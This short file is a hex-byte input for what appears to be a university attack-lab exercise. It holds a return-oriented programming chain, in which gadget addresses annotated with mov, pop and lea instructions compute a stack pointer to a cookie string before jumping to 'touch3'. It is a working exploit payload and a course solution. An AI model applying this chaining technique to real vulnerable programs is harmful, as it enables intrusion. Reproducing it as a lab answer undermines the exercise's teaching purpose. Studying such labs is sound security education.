00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00  //mov rsp rax
a2 19 40 00 00 00 00 00  //mov rax rdi
ab 19 40 00 00 00 00 00   //pop rax
48 00 00 00 00 00 00 00 // 偏移值
dd 19 40 00 00 00 00 00     //movl eax edx                     
34 1a 40 00 00 00 00 00    // movl edx ecx
13 1a 40 00 00 00 00 00    //movl ecx esi                          
d6 19 40 00 00 00 00 00   // lea  (%rdi,%rsi,1),%rax
a2 19 40 00 00 00 00 00  //mov rax rdi
fa 18 40 00 00 00 00 00  //touch3
35 39 62 39 39 37 66 61  //string
00 00 00 00 00 00 00 00 